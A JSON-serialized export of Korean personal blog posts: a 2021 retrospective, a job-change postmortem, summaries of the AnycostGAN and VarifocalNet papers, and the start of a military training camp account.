이후에도 열심히 할 거에요!\n\n## Github\n\n올해 github에서 open source 활동한 걸 보면 약 1.6k contributions을 했는데, PR을 squash merge 하거나 개인 계정으로 회사 team에 invited 하는 형태가 아니라서 잔디밭이 군데군데 빈 것이 조금 아쉽네요.\n\n![github](./github.png)\n\n지금까진 주로 ML/DL 논문 구현/재현을 했는데, 최근부턴 [`pytorch_optimizer`](https://github.com/kozistr/pytorch_optimizer)같이 실용적이고 잘 정돈된(?) 프로젝트들을 만들기 시작했습니다. 실질적으로 당장 내가 쓸 수 있는 pip package가 output으로 나오니까 뭔가 동기부여도 되고 좋은 것 같아서, 앞으론 다른 사용자들이 편하게 쓸 수 있는 형태로 작업하려고 합니다.\n\n또, 희망 사항이긴 하지만 회사 차원에서 open source project를 해 보는 것도 제 목표에 있기 때문에, 한번 열심히 설득해 봐야 겠어요.\n\n## 회사\n\n이직했습니다. 몇 주 전에 쓴 [퇴사부검](https://kozistr.tech/postmortem/) 글에 이직한 이유에 대해 적어봤지만, 요약하면 제 분야에서 토론하고 가슴 뛰는 일을 다시 해 보고 싶고 `Kaggle` 같은 경험을 하고 싶어서 최대한 비슷한 환경을 찾으려 돌아다니는 거 같아요. 하지만 현실에서 이상을 바라는 것은 힘들다는 걸 알지만, 여러 팀하고 이야기하고 경험해 볼수록 원하는 게 너무 이상적인가? 타협하고 버텨야 하는 건가? 란 생각이 들면서 고민이 많아지더라고요. 주로 경험했던 회사들이 ML/DL을 사용하기 시작하는 단계라서 이 부분을 알면서 선택한 거라 감수해야 하는 부분인데, 버티지 못한 거라 결국 제 책임이라 딱히 할 말이 없기도 하네요.\n\n처음엔 많이 스트레스 받았고 오랫동안 생각해 봤는데, 지금은 어느 정도 타협하고 기준과 관점을 조금 바꿔봤습니다. 이번에 이직한 회사를 선택한 이유도 그렇고요. 이전과는 다른 기준과 마인드로 회사를 선택했기 때문에, 솔직히 입사 전날까지도 `정말 이게 맞는 판단이었을까?`란 생각도 들었고 `잘 해낼 수 있을까?`란 생각도 들었습니다. 물론 제가한 모든 선택에 후회는 없습니다!\n\n입사한 지 2주밖에 안 됐고 새로운 기준으로 고른 곳이 바라는 이상적인 환경과 거리는 있지만, 이상적이라 생각하는 환경을 주도해서 만들 수 있는 곳이라 생각해요. 팀 빌딩 한 지 얼마 지나지 않았고 입사 첫날부터 시도하는 게 있는데, 이번에도 좋은 문화 만들고 재밌게 일 할 수 있도록 열심히 해 봐야겠습니다!\n\n## 운동\n\n운동도 꾸준히 하고 있습니다. 집에서 열심히 홈트를 하고 있는데요, 올해 초만 해도 헬창 마인드로 빡세게 했는데 요즘엔 전보단 시간 없거나 목표가 분명하지 않아서 조금 느슨해진 감이 있어요. 그리고 살찌는 음식을 전보다 많이 먹어서인지 복근이 점점 사라지고 있는데, 유산소도 다시 열심히 하고 당장 목표도 분명하게 세워서 열심히 해야 할 거 같아요. 운동 시작할 처음에 [`4년 안에 풀 플란체`](https://namu.wiki/w/%ED%94%8C%EB%9E%80%EC%B2%B4) 하는 걸 목표로 잡았었는데, 더 단계적이고 구체적인 목표를 세워야 할 거 같아요.\n\n최근에 크로스핏이나 클라이밍을 해볼까 각을 보고 있는데, 회사 근처에 함 찾아봐야겠어요.\n\n그래도 확실한 건 운동을 시작하고 난 후부터, 몸도 더 가벼워지고 사람같이 건강해진 느낌이 들어서 만족하고 있습니다.\n\n![workout](./workout.png)\n\n## 취미\n\n### 천체관측\n\n취미가 운동말고는 너무 정적이라 야외에서 하고 동적인 취미를 하나 가져보고 싶긴 했습니다. 천체 관측하는 걸 좋아해서 고등학교 때 동아리도 했었는데, 언젠가 여건이 된다면 꼭 해보고 싶어요.\n\n### 요리\n\n요리하는 것도 좋아해서 전엔 자주 했었는데, 요즘엔 또 귀찮아져서인지 안 하게 되더라고요. 연말엔 맛있는 요리해서 가족이나 친구들하고 연말파티도 하고 싶었는데 코시국 때문에 뭔가 애매해 졌네요.\n\n### 주식\n\n취미 아닌 취미로 주식을 하기 시작했는데요, 장기적인 관점에서 가치투자를 하고 싶어서 취미(?)로 재무제표 분석하는 법을 공부하고 기업들을 분석하다 보니 취미가 된 거 같습니다. (~~테슬라 가즈아~~)\n\n공부하다보니 언젠가 이런 분야도 직업으로 가져봐도 재밌겠다는 생각이 들더라고요.\n\n![doge](./doge.png)\n\n## 훈련소\n\n올해 5월에 3주 동안 논산에 있는 훈련소도 다녀왔습니다. 3주 동안 외부망 안되는 sandbox에 가만히 앉아있으니 멍한 것처럼 아무 생각도 들지 않더라고요. 마침 코로나 때문에 훈련소 극단적인 규제 등이 기사에 떠돌던 때라 걱정도 많이 했는데 (실제로 들어가기 전에 식사를 거의 안 함), 다행히 기사가 나온 직후라 규칙이나 그런 것들이 많이 풀려서 편하게 갔다 왔습니다.\n\n## 계획\n\n요 정도를 적어봤는데, 항목은 많지 않지만 그래도 challenging 하지 않을까 생각합니다. 내년에도 힘내서 열심히 해 봐야겠어요!\n\n* 좀 활동적인 취미 가지기\n* Kaggle Competition Master\n* 팀 문화 잘 만들어 나가기\n* 운동 꾸준히 열심히 하기\n","excerpt":"TL;DR 2020년도 회고한 지 얼마 안된 거 같은데 벌써 2021년이 끝나가네요. 올해에도 심경의 변화나 많은 events가 일어나진 않았지만, 최근에 쓴 퇴사부검도 그렇고 일어난 일 하나하나 굵직했던 거 같아요. 올해 키워드를 하나 뽑는다면  …","fields":{"slug":"/Review2021/"},"frontmatter":{"date":"Dec 17, 2021","title":"2021년 회고","tags":["Diary"],"update":"Dec 28, 2021"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n올해도 여러 큰 사건(?)들이 있었지만, 그 중 **또 한 번의 이직**이 가장 큰 사건이 아닐까 싶습니다. 지난 2년 동안 회사를 알아보고 이직하는 과정을 매년 하니 지치고 병특이라 총알(이직 선택지)이 많이 없어서, 일단 환경이 어떻든 버텨봐야 지란 마인드로 살아왔는데, 어느 순간 돌이킬 수 없는 현타가 왔고 결국 이직을 하게 된 거 같습니다.\n\nNetflix에는 퇴사 문화로 [postmortem e-mail](https://content.v.kakao.com/v/5e54ead52007421c9da29a4b)라는게 있습니다. 퇴사하는 직원이 퇴사 당일 동료에게 메일 한 통을 보내는 문화인데, 갠적으로 회사에서도 퇴사자가 왜 퇴사를 하는지 알 수 있고 퇴사자도 자기 생각을 정리할 수 있는 좋은 문화라 생각합니다.\n\n![img](./postmortem-email.png)\n\n마침 배민 기술 블로그에 올라온 [퇴사 부검](https://techblog.woowahan.com/2723/)글도 보면서, 올해는 Netflix 퇴사 부검 문화에 맞춰서 회고해 볼까 합니다.\n\n## 퇴사 부검\n\n### 1. 왜 떠나는지\n\n개인적으로 개발을 취미로 할 정도로 무언갈 공부하고 개발하는 걸 정말 좋아하는 일상이 개발인 개발자인데요, 여담으로 벌써 개발 공부를 중1 때 시작했으니 시작한 지도 10년이 넘었네요.\n\n가끔 주위 사람들이 \"개발이 취미고 직업도 개발자니, 덕업일치네~\" 라는 말을 하는데, 사실 이 말은 **50%는 맞고 50%는 틀린 말**이라 생각해요.\n\n개발하는 게 정말 좋아서 **업무 자체에서 오는 스트레스는 거의 없고** 그 순간순간이 재밌다 느껴지는 부분에서 50% 맞지만, 50% 틀린 이유는 **내가 하고 싶은 재밌는 개발**을 했을 때 재밌지, 내가 원하지 않는(직무와 관련이 없는) 스텍이나 좋지 않은 개발문화에서 일하는 건 정말 스트레스인 거 같아요.\n\n예를 들면 회사에서 `이상과는 다른 개발`을 했다면 퇴근 후엔 `이상적인 개발`을 하면서 힐링하는 느낌이에요. (물론 회사에서도 재밌는 일을 하고 있어요)\n\n그래서 회사를 고를 때 연봉이나 다른 조건보다 더 중요하게 보는 게, **정말 내가 재밌게 일할 수 있을까?**, **나중에 돌아봤을 때 남는 게 많을까?** 에요.\n\n저는 지금 Data Scientist/Machine Learning Engineer 연관 직무에서 일하고 있고 현재까진 **재밌게**란 기준이 다음과 같은데\n\n1. 지금까지 경험하지 못한 주제\n2. 주제 자체가 너무 매력적이고 재밌어 보이거나\n3. 해당 주제로 해볼 만한 게 많은 곳\n\n% 주제 : 서비스, 회사가 가진 데이터\n\n이번에 떠나는 이유는 **다른 이유가 더 크기도 하고 3번에 가까운 거** 같아요.\n\n처음엔 추천시스템이란 주제가 전에 경험해본 적 없는 새롭고 재밌어 보이는 주제였고 서비스에서 유저들에게 추천시스템을 개선해서 좋은 사용자 경험을 주고 싶은 생각으로 입사를 하게 됐는데, 개인적으론 시간이 지날수록 추천이란 한 가지 주제에 집중하기엔 어려웠고 추천 이외에 해볼 수 있는 주제들도 한계가 느껴졌습니다.\n\n정리하면 **회사에서 내가 재밌게 할 일이 더 있나?** 란 질문에 저도 답을 찾지 못했고 회사도 답을 주지 못해서 결국 떠나게 된 거 같습니다.\n\n![byebye](./byebye.png)\n\n#### 바로 떠나지 않은 이유?\n\n사실 작년 말 ~ 올해 초부터 퇴사 고민을 시작했는데,\n\n* 정말 내가 현재 상황을 개선하기 위해서 많은 노력을 했나?\n* 그런 노력 없이 그저 더 좋은 환경만을 바라는 도피성 이직인가?\n\n**무언가만 바라거나 도망쳐서 도착한 곳은 절대 행복할 수 없는** 걸 알기에, 적어도 내가 할 수 있는 노력은 다 해야 후회 없이 후련하게(?) 떠날 수 있을 거 같아서 그 시점부터 기술적이나 문화적으로 더 노력해 봤던 거 같아요.\n\n### 2. 회사에서 배운 것\n\n1년 반이라는 짧다면 짧고 길다면 긴 시간이지만 그래도 다양하고 많은 일을 했습니다.\n\n다양하고 많은 일을 하고 성과도 냈지만, 사실 배운 것이 제일 아쉬운 부분입니다. 좋게 말하면 **내가 알고 있는 지식을 정리하고 팀 문화에 정착/기여**했다고, 나쁘게 말하자면 **없다**인 거 같아요.\n\n주로 팀에서 제 역할은 기술을 팀에 적용하고 팀원들을 기술적으로 케어해 주는 그런 역할이었던 거 같아요. (물론 이 과정에서도 배운 게 있다고 생각합니다).\n\n이번 회사까지 경험을 통해 확실하게 나에 대해 깨달은 것들이 있는데 하나만 적어보자면,\n\n#### 너! 내 동료가 제발 되어주세요\n\n직무적인 부분에선 주로 혼자 일을 했고 처음에는 일에만 몰입하느라 잘 몰랐는데, 혼자 일을 할 때의 장점도 있지만 내가 하는 일에 feedback을 줄 수 있는 동료가 없고 서로 대화하면서 문제를 푸는 즐거움을 느끼지 못하는 부분에서 시간이 지날수록 정말 힘 빠지는 걸 느꼈습니다. 그래서인지 회사를 구할 때 가장 먼저 확인하는 부분이 같은 직무에 동료가 있는지를 1순위로 확인하곤 합니다.\n\n![be_my_companion](./be_my_companion.png)\n\n### 3. 회사에서 아쉬운 점\n\n물론 아쉬운 점은 많습니다. 입사했을 때 업무에 집중하고 일하는데 필요한 것들을 물어봤을 때 답했던 점들이 결국엔 현실적이거나 여러 문제로 이뤄지지 않았지만, 개인적으로 일부는 내가 더 적극적으로 노력했다면 어쩌면 해결할 수 있었을 텐데 생각이 들어 저에게 아쉬운 점이 남아있긴 하네요.\n\n### 4. 앞으로의 계획\n\n새로운 회사에 12월 6일 입사를 하는데, 다시 핀테크 회사로 가게 됐습니다. 사실 앞으로의 생활(?)이나 업무가 어떻게 될지 아직도 잘 모르겠어요 ㅋㅋㅋㅋ. 그래도 재밌는 경험할 수 있을 거 같아서 기대되는데, 이전에 할 수 없었던 새로운 경험을 할 수 있으면 좋을 거 같습니다.\n\n### 5. 회사의 메시지...?\n\n(아마 누군가 어딘가에 남겨 주시겠죠...?)\n\n## 정리\n\n여러 분들과 여러 이야기하면서 제 생각과 입장을 존중해주셔서 감사하고, 개인적으로 느꼈던 팀에 아쉬웠던 점들이나 더 잘되기 위해서 어떻게 하면 좋을지 피드백 남기면서 (저는) 잘 마무리했다 생각하는데, 쨋든 올해도 새로운 곳에서 새로운 도전하게 됐고, 잘해 나아갈 수 있으면 좋겠습니다.\n\n![result](./result.png)\n","excerpt":"TL;DR 올해도 여러 큰 사건(?)들이 있었지만, 그 중 또 한 번의 이직이 가장 큰 사건이 아닐까 싶습니다. 지난 2년 동안 회사를 알아보고 이직하는 과정을 매년 하니 지치고 병특이라 총알(이직 선택지)이 많이 없어서, 일단 환경이 어떻든 버텨봐…","fields":{"slug":"/postmortem/"},"frontmatter":{"date":"Dec 05, 2021","title":"2021년 퇴사 부검","tags":["Diary"],"update":"Dec 15, 2021"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nGithub에 들어가면 우측 상단에 `Explore repositories`에서 종종 재밌는 repositories를 추천해줘서 자주 구경 중인데, `AnycostGAN`도 이렇게 보다 논문까지 읽어보다 재밌어 보여서 짧게 정리해 보려고 합니다.\n\n* paper : [arXiv](https://arxiv.org/abs/2103.03243)\n* github : [repo](https://github.com/mit-han-lab/anycost-gan)\n\n## Related Work\n\n* StackGAN : [paper](https://arxiv.org/abs/1612.03242)\n* ProGAN : [paper](https://arxiv.org/abs/1710.10196)\n* StyleGANv2 : [paper](https://arxiv.org/pdf/1912.04958.pdf)\n* MSGGAN : [paper](https://arxiv.org/pdf/1903.06048.pdf)\n\n## Introduction\n\n대부분의 이미지 synthesis하거나 editing 하는 모델들을 보면 엄청나게 커서 computation cost가 꽤 드는 편인데 (e.g. StyleGAN2, ...), 고성능 GPU에서 inference 해도 몇 초가 걸리기도 하다는 점을 issue 합니다. 유저들이 실시간이나 edge-device에서 사용하려면 빠르고 computation cost가 낮아야 하는데, 이런 점들을 이번 논문에서 이미지 퀄을 비슷하게 유지하면서 x6 ~ 12 빠르게 생성이 가능한 무언가를 제안합니다.\n\n논문의 목표는 `run at diverse computational costs`라고 하며, 넓은 범위의 computational costs에 따른 계산(~= 이미지 생성)이 가능하다는 점 입니다. editing 같이 빠르게 수정해야할 니즈가 있는 건 low-cost(sub) generator를 사용해 preview를 보여주고, 최종 결과물을 render할 때엔 high-cost(full) generator를 사용할 수 있다고 합니다.\n\n아래와 같이 크게 `3개의 특징`으로 정리해 볼 수 있습니다.\n\n1. `stage-wise training` to stablize the process\n    * a generator가 여러 configurations에 대해 minmax optimization하는 건 pretty challenging한 일\n2. two types of `channel configurations`\n    * uniform channel reduction ratio\n    * flexible ratios\n3. `consistency-aware` encoder & `iterative optimization` for image projection\n    * optimize reconstruction loss for the both generators\n\n## Architecture\n\n![architecture](architecture.png)\n\n위에는 AnycostGAN의 전반적인 flow.\n\n### Learning Anycost Generators\n\n아래는 다른 구현체들과 AyncostGAN architecture를 diff한 이미지\n\n![architecture_diff](architecture_diff.png)\n\n#### Multi-resolution training\n\n이미 이전에 StackGAN, StyleGANv2처럼 diverse resolutions 이미지를 생성하는 연구가 있었지만, low-resolution과 output (high-resolution) 이미지가 자연스럽지 못하다는 문제를 듭니다.\n\n그래서 `multi-scale objectives`를 추가해서, gradually 여러 해상도의 좋은 퀄 이미지를 얻을 수 있다고 합니다.\n\nmultiple-resolutions로 학습할 때, MSG-GAN에서 채택한 방식처럼 학습하면 (주로 large-scale datasets에서) fidelity degradation이 발생할 수 있다고 합니다 (single-resolution으로 하는 방법 보단).\n\n그래서 `sampling-based` objective를 제안했는데, 한 step에 하나의 resolution에 대한 imsage를 sample해서 사용한다고 합니다. 또한, `low-resolution` image를 생성할 땐 $G$ network의 중간 layer를 output으로 사용했다고 합니다.\n\n아래는 multi-scale objectives를 추가했을 때 해상도 별 이미지 퀄리티를 확인할 수 있는데, 확실히 각 resolution-level(?)별로 퀄리티가 훨씬 좋아지는 점이 있습니다. 또한, consistency term도 추가해 low/high resolution 간 perceptual도 훨씬 좋아진 걸 확인할 수 있네용\n\n![multi-scale_consistency](multi-scale_consistency.png)\n\n#### Adaptive-channel training\n\ncomputational cost를 줄이기 위해 channel 부분도 variable 하게 만듭니다. 각 layer 마다 다른 channel multipliers를 가지게 하는데, `uniform` or `flexible`한 전략을 소개합니다.\n\n각 training iteration에, channel multiplier을 sample하고, sample한 부분만 update한다고 합니다.\n\n마지막으론, 모델을 초기화할 떈 이전 stage에서 학습한 weight를 사용하고, magnitude of kernel에 따라 conv layer의 channel을 sort했다고 합니다.\n\n요 정도로 학습하면 어느 정도 잘 학습하지만, 논문에서 목표하는 정확한 preview (full image와 consistency가 있어야 함)를 생성하는데 문제가 있다는 점을 언급하며 `consistency loss` term을 추가합니다.\n\n* `consistency loss` = `MSE loss` + `LPIPS loss`\n\n#### Generator-conditioned Discriminator\n\n각각 다른 sub-generators의 channels과 resolutions을 한번에 학습해야 하는데, single discriminator를 사용하는건 성능에 영향을 줄 거라 생각해서 `generator-conditioned` discriminator를 만들었다고 합니다.\n\n여러 직관적인 방법이 있겠지만, 설계 및 성능상 영향을 줄수 있어서 `learning-based` 접근 방식으로 `conditioning`을 구현했다는데, 위에 이미지 Figure3(c)에 4차원 짜리 vector (one-hot encoding한) *g_arch* (for the ratios)을 concat해 준다고 합니다.\n\n#### Searching under different budgets\n\n한 줄 요약으로 `evolutionary search`로 적절한 budget내에서 configuration을 찾을 수 있다고 캅니다.\n\n### Image Projection w/ Anycost Generators\n\n#### Consistency-aware image projection\n\nediting task를 진행하려면 먼저 image를 latent space로 projection해야 하는데, 2 가지 방식이 있을 수 있습니다.\n\n* Encoder-based projection\n  > $E^{*} = argmin_{E} L(G(E(x)), x)$\n  >\n  > $L = MSE + LPIPS$\n\n* Optimization-based projection\n  > $w^{*} = argmin_{w} L(G(w), x)$ with iterative gradient descent\n  >\n  > $L = MSE + LPIPS$\n\n하지만 랜덤하게 sampled된 latent code로 부터 이미지를 생성하면, predicted/optimized $E(x)$는 prior distribution을 follow하지 못할 수 있습니다.\n\n그래서, full generator에서도 동작해야하고 randomly sampled된 latent code에 대해서도 잘 동작할 수 있게 objective를 수정했다고 합니다.\n\n> $E^{*} = argmin_{E} [L(G(E(x)), x) + \\alpha E_{k,c^{\\lambda}}(G_{C}^{k}(E(x)), x)]$\n>\n> $w^{*} = argmin_{w} L(G(w), x) + \\alpha E_{k,c^{\\lambda}}(G_{C}^{k}(w), x)$\n>\n> $\\alpha = 1$\n\n#### Image-editing with anycost generators\n\nlatent code를 edit하기 위해서 간단하게 $\\Delta w$를 $w$에 더해줍니다. 즉, 다음곽 같이 새로운 이미지를 생성합니다.\n\n> $G_{C}^{k}(w + \\Delta w)$\n\n## Performance\n\n### single vs multi-resolution on FFHQ\n\nFFHQ dataset에서 FID-70k를 측정했는데, sampling-based multi-resolution으로 학습을 하니 single resolution method보다 좋은 FID를 얻었네요.\n\n![fid_score](fid_score.png)\n\n### Budgets\n\n다음은 성능대비 costs를 benchmark한 plot인데, 다른 methods들 보다 가성비가 좋다는 것도 보여줬습니다.\n\n![budgets](budgets.png)\n\n### StyleGANv2 vs AnycostGAN\n\n성능도 comparable하게 가져가고 있다는 점도 흥미롭네요\n\n![anycost_vs_styleganv2](anycost_vs_styleganv2.png)\n\n### Consistency-aware encoder benchmark\n\nconsistency-aware term도 추가하면서, $G`$, $G$의 consistency도 metric상 꽤 좋게 나옵니다.\n\n![consistency_aware_encoder_benchmark](consistency_aware_encoder_benchmark.png)\n\n### Generated samples\n\n![anycostgan_flexible](anycostgan_flexible.png)\n\n## Conclusion\n\n갠적으로 real-world에서 user가 사용할 수 있는 형태를 고려한 연구라 더 재미있게 읽었고, adaptive-channel을 사용하고 이걸 잘 훈련하는 idea도 멋지다 생각했어요. 또한, 다른 stabilization methods들도 make sense하고 흥미로운 논문이었습니다. 뭔가 Nvidia에서 나온 논문처럼 benchmark하고 samples이 rich 해서 더 좋았던 거 같아요.\n\n결론 : 굳굳굳\n","excerpt":"TL;DR Github에 들어가면 우측 상단에 에서 종종 재밌는 repositories를 추천해줘서 자주 구경 중인데, 도 이렇게 보다 논문까지 읽어보다 재밌어 보여서 짧게 정리해 보려고 합니다. paper : arXiv github : repo R…","fields":{"slug":"/AnycostGAN/"},"frontmatter":{"date":"Aug 07, 2021","title":"Anycost GANs for Interactive Image Synthesis and Editing","tags":["Deep-Learning"],"update":"Aug 07, 2021"},"timeToRead":6}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근에 Object Detection (이하 OD) task 관련 kaggle challenge를 하다, 비슷한 대회 solutions들을 보다가 상위 랭크 solution에 `VertiFocalNet` (이하 `VFNet`)을 사용한 걸 발견해서, 요 논문을 더 자세하게 공부해 보고 싶어서 정리해 봅니다.\n\nOD 쪽을 오랜만에 공부해 보니 그동안 공부 안 했던 스택이 쌓였는지, 볼 것도 많지만 대회에도 써 보면서 재밌게 공부했습니다.\n\n* `VertiFocalNet` papepr : [arXiv](https://arxiv.org/pdf/2008.13367.pdf)\n* `VertiFocalNet` official repo : [github](https://github.com/hyz-xmaster/VarifocalNet)\n\n## Related Work\n\n논문에서 제시하는 novelty들에 직/간접적으로 영향을 주거나 관련있는 논문들.\n\n* Deformable Convolution : [arXiv](https://arxiv.org/abs/1703.06211)\n* FCOS : [arXiv](https://arxiv.org/abs/1904.01355)\n* ATSS : [arXiv](https://arxiv.org/abs/1912.02424)\n* FocalLoss : [arXiv](https://arxiv.org/abs/1708.02002)\n\n## Introduction\n\nOD task에서 높은 성능을 얻으려면 candidate detection를 rank 하는 게 중요한 것 중 하나인데, 이전 연구들은 classification or localization score 등을 candidates를 rank 하는데 사용해 **reliable 하지 못하다**는 점을 짚으며, 요걸 joint learn 할 수 있는 reliable 한 method, IACS (IoU-Aware Classification Score)를 제안합니다.\n\n이 논문에서 제시하는 novelty는 크게 3가지입니다.\n\n1. IACS (IoU-Aware Classification Score)\n2. VertiFocal Loss\n3. Star-Shaped Box Feature Representation\n\n## Architecture\n\n![vertifocal_loss](vertifocal_loss.png)\n\n### IACS (IoU-Aware Classification Score)\n\n`IACS`는 classificaiton score vector 인데, 각 값들은 gt and predicted bbox 의 IoU 값이 됩니다. 위에 첨부한 `Figure 1` 과 같습니다.\n\n### VertiFocal Loss\n\n`IACS`를 탐지하기 위해 `VertiFocal Loss`를 설계했는데, idea는 `Focal Loss`에서 가져왔습니다. 이유는 IACS를 regress할 때 imbalance 문제를 해결하기 위해서라고 합니다.\n\n> $VFL(p, y) = -q(qlog(p) + (1 - q)log(1 - p)), q > 0$\n>\n> $VFL(p, y) = -\\alpha p^{\\gamma}(1 - p), q = 0$\n\n$p$ = predicted IACS, $q$ = target score\n\nfg (foreground)일 때는, $q$ = gt 와 generated bbox 의 IoU\nbg (background)일 때는, 모든 classes에 대해 target $q$ = 0\n\n논문에서 bg 일 때 ($q$ = 0)는 negative examples에 대해서**만** factor ($p^{\\gamma}$)로 scale 하는 이유는, positive exmaples ($q$ > 0)에선 negative exmaples에 비해 rare 하게 등장하기 때문에 scale 하지 않았다고 합니다. 그리고 $q$ = 0일 때, $\\alpha$를 scale 해 positive, negative losses 사이에 balance를 잡아줬다고 합니다.\n\n### Star-Shaped Box Feature Representation\n\n`IACS`를 에측하기 위해서 Star-shaped Box Feature Representaion을 개발했다는데, 요약하면 deformable convolution\n로 9 개의 bbox points (= `Figure 1`에 노란 점들)를 표현하는 무언가다.\n\n구체적인 과정은,\n\n1. initial bbox, 4 points (x1, y1, x2, y2)를 fixed kernel size의 3x3 convolution으로 찾는다.\n2. By `FCOS`, points들이 4d-vector로 encoded됨. ($l'$, $t'$, $r'$, $b'$).\n    * $l'$ : distance from sample location (x, y) to left side of the bbox.\n    * $t'$ : distance from sample location (x, y) to top side of the bbox.\n    * $r'$ : distance from sample location (x, y) to right side of the bbox.\n    * $b'$ : distance from sample location (x, y) to bottom side of the bbox.\n3. 요 것들로 9 points를 `Figure 1` 그림처럼 생성\n\n끝으로 추가적인 예측으로 요런 points들을 생성하지 않아 computation-efficient 라고 캅니다.\n\n### Bounding Box Refinement\n\nbbox refinement 과정도 있는데, 기존 dense od에선 비효율적이라 잘 쓰이지 않았지만, 위에 제안한 Star-shaped Box Feature Representation 덕분에 효율적으로 refine이 가능하다고 합니다.\n\n아래 이미지는 전체적인 architecture 입니다.\n\n![architecture](architecture.png)\n\n## Train Recipe\n\n### Loss\n\n전체 로스는 다음과 같이 정의했는데, VFL + initial, refined bbox 둘 다 loss를 구해서 최소화 하도록 합니다.\n\n![loss](total_loss.png)\n\n## Performance\n\n### COCO\n\nMS COCO에서 AP metric 기준 SotA 달성했다.\n\n![performance](performance.png)\n\n### VFL\n\n다른 dense od에 VFL를 적용해 봤을 때, 전반적으로 성능이 올라가는 점도 확인할 수 있었습니다.\n\n![vfl_performance](vfl_performance.png)\n\n## Conclusion\n\n20년 기준 SotA AP를 달성했고, 제안한 VFL만 다른 구현체에 적용했을 때 promising 한 performance를 보여줘서 성능적 측면에도 좋아 보였다. 논문에서 제안한 novelty들 설계도 make sense하고 재밌게 봤다.\n\n결론 : 굳굳\n","excerpt":"TL;DR 최근에 Object Detection (이하 OD) task 관련 kaggle challenge를 하다, 비슷한 대회 solutions들을 보다가 상위 랭크 solution에  (이하 )을 사용한 걸 발견해서, 요 논문을 더 자세하게 공부…","fields":{"slug":"/VFNet/"},"frontmatter":{"date":"Jul 26, 2021","title":"VertiFocalNet - An IoU-aware Dense Object Detector","tags":["Deep-Learning"],"update":"Jul 26, 2021"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n지난 4월 29일 ~ 5월 20일까지 3주간 육군훈련소를 다녀왔습니다. 들어가기 1주일 전부터 훈련소에서 코로나 격리 수준이 기본권을 침해한다는 등 여러 기사와 썰 들이 돌아다니고, 최근에 다녀온 지인들도 격리주간에 꽤 힘들었다는 말을 들어서 좀 많이 쫄은(?) 상태로 입소했어요.\n\n저는 25연대 2교육대 5중대였어요. 머리는 첫 날에 좀 길어 보이는 사람들만 10mm로 밀리고, 나가는 날까지 검사는 따로 안 하더라고요. 25mm도 잘렸는데, 안전빵으로 15mm로 밀고 가길 잘한 듯해요. 연령대는 우리 분대가 절반이 24살 이상으로 상대적으로 높은 편이었어요. 사람들도 다 괜찮아서, 사람 문제 없이 편안하게 지냈습니다.\n\n훈련은 다른 훈련소 후기에서도 말하듯 빡세지 않았어요. 특히, 이번 기수가 온갖 혜택(?)을 받다 보니, 아마 역사상 훈련을 가장 적게 하지 않았나도 싶네요. 오히려 격리 주차에 방 밖으로도 못 나가고 안에 앉아만 있어야 해서, 시간과 정신의 방이 제일 힘들었던 것 같습니다.\n\n입소하기 전, 기사화가 많이 돼서인지 기사에 나온 사실과 다르게 괜찮은 대접(?)을 받으며 살다가 왔습니다.\n\n## 일정\n\n2021년 올해부터 산업기능요원 훈련소 기간이 3주로 축소됐는데, `평일 공휴일 2일 + 짧아진 훈련소 기간 + 코로나 격리` ~~덕~~때문에 꽤 촉박한 일정을 보냈어요.\n\n```\n1 주차\n4월 29일 (목) : 입소\n4월 30일 (금) : 코로나 PCR 1차 검사\n5월  1일 (토) : 코로나 PCR 1차 검사 결과\n5월  6일 (목) : 코로나 PCR 2차 검사\n5월  7일 (금) : 코로나 PCR 2차 검사 결과\n\n2 주차\n5월 10일 (월) ~ 5월 15일 (금) : 총기 (3일) + (수류탄 + 각개전투) (2일)\n\n3 주차\n5월 18일 (월) : 20km 행군\n5월 19일 (화) : 체력평가 + 정비\n```\n\n사전에 정해진 일정은 다음과 같은데, 중간에 여러 이슈가 있어서 일부 훈련 날짜가 줄고, 없어지기도 했어요.\n\n총기가 2일로 줄고, 첫날 총기 다루는 법 교육은 실내(예정은 실외)에서 진행했고, 실탄사격(영점사격) 때만 사격장 가서 실습한 게 전부에요. 하루가 줄어서 영점사격 후에 연사(?)인가 여러 발 쏘는 훈련이 또 있다는데, 요게 없어졌어요.\n\n그리고 훈련 일정에서 **행군이 없어졌어요**.\n\n## 격리 주 일정\n\n전반적인 일정은 위와 같았고, 격리 주간(1 주차)은 다음과 같았어요.\n\n* 4월 29일 ~ 4월 30일 (목 ~ 금)\n  * 식사는 생활관 안에서 전식(전투식량)\n  * 양치 원래는 불가능 -> 야외에서 일렬로 하수구 위에 서서 시켜줌\n  * 잠잘 때 마스크 쓰는 걸 **권장**\n  * 화장실은 분대(생활관 방) 단위로 여러 명 모아서, 벨을 울리면 조교가 동행하는 방식\n  * PCR 1차 결과까진 샤워는 안 시켜줌. 식사도.\n  * 세면은 2명인가 4명씩 단위로 세면장에서 세면하게 함.\n* 5월 1일 ~ 5월 7일 (일 ~ 금)\n  * PCR 2차 결과 전까지, 배식차가 생활관 앞에 와서 분대장님이 배식해 줌 -> 자율배식으로 바뀜\n  * 세면장에서 샤워, 세면, 빨래 가능\n\n2차 PCR 검사까지 끝나고는 식당에 가서 식사했어요.\n\n격리 때 힘들었던 것은 전 크게 2가지 였는데,\n\n1. 식사 (전투식량...)\n2. 시간과 정신의 방\n\n처음에 격리 3~4일까진, 화장실, 양치, 세면이 불가능하다 해서 최대한 참으려고 3일을 굶고 입소했어요. 그렇게 들어가서 받은 첫 끼가 전투식량(ㅊㅊㅈㅌ 라는 전투식량 무언가)인데, **개인적으론** 그 맛이 정말 3일을 굶어도 안 먹어지는 맛이라, 훈련소 기간 동안 전식은 대부분 버린 듯해요. 가끔 전식줄 때 참치 통조림을 주는데, 저는 요거로 연명했습니다. 특히, 이번 기수가 격리 기간엔 주로 전식을 먹고, 훈련 때는 또 원래 전식을 먹게 되니, 거의 10끼는 전식을 먹은 듯해서, 조금 힘들었습니다.\n\n첫 1주 동안, PCR 2차 결과가 나오기 전까지 생활관 안에서 격리를 당하는데, 이 동안엔 거의 아무것도 못 해서 정말로 지루합니다. 실내에서 교육을 진행하는데, 다 해 봐야 몇 시간도 안 돼서 정말 빈 시간이 엄청나게 많습니다. 코시국에 훈련소에 가시는 분이라면, 책이나 스도쿠 같은 걸 꼭 챙기길 추천해 드릴게요.\n\n## 훈련 일정\n\n위에서 언급했지만, (제 기준으로) 훈련은 빡세지 않았어요. 가서 정신교육, 영점사격, 종합각개전투 여러 훈련이 있는데, 처음엔 